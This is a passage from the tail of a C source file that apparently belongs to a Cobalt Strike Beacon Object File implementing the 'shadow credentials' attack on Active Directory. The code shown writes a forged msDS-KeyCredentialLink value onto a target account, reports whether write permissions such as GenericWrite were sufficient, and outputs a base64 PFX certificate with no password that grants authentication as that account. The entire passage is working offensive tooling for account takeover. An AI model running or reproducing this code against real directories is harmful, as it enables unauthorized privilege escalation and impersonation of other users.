            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to write msDS-KeyCredentialLink");
            BeaconPrintf(CALLBACK_OUTPUT, "[!] You may need GenericWrite/GenericAll on target");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote msDS-KeyCredentialLink successfully!");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Skipping msDS-KeyCredentialLink write (--no-write)");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] DeviceID: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
        deviceId.Data1, deviceId.Data2, deviceId.Data3,
        deviceId.Data4[0], deviceId.Data4[1], deviceId.Data4[2], deviceId.Data4[3],
        deviceId.Data4[4], deviceId.Data4[5], deviceId.Data4[6], deviceId.Data4[7]);

    /* Step 5: Output PFX */
    {
        DWORD b64Len = 0;
        CryptBinaryToStringA(pbPfx, nPfxLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64Len);
        char* b64 = (char*)malloc(b64Len + 1);
        CryptBinaryToStringA(pbPfx, nPfxLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64, &b64Len);

        BeaconPrintf(CALLBACK_OUTPUT, "[+] PFX (base64, no password):\n\n%s\n", b64);

        free(b64);
    }

cleanup:
    if (pbUserSID) free(pbUserSID);
    if (pbPublicKey) free(pbPublicKey);
    if (pbPfx) free(pbPfx);
    if (pbKeyCredBlob) free(pbKeyCredBlob);

    CoUninitialize();
}
